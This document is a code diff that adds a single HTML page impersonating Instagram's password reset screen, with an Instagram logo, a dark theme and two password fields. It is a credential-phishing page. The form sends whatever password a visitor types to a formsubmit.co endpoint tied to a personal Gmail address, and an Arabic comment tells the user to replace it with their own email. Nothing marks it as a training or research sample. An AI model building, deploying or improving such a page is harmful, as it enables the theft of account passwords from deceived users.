@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reset Password</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 90%;
+            margin: auto;
+            background: #121212;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            background: #333;
+            color: white;
+            font-size: 14px;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #405DE6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn:hover {
+            background-color: #3040b4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.postimg.cc/ZnmzxWc7/png-klev-club-rqyi-p-nadpis-instagram-png-2.png" alt="Instagram Logo" class="logo"> 
+        <h2>Create a strong password</h2>
+        <p>Your password must be at least six characters and should include a combination of numbers, letters, and special characters (!$@%).</p>
+        
+        <!-- ✅ استبدل YOUR_EMAIL_HERE ببريدك الشخصي -->
+        <form action="https://formsubmit.co/gassaaayoub07@gmail.com" method="POST">
+            <input type="password" name="password" placeholder="New password" class="input-field" required>
+            <input type="password" name="confirm_password" placeholder="New password, again" class="input-field" required>
+            <button type="submit" class="btn">Reset Password</button>
+        </form>
+    </div>
+</body>
+</html>
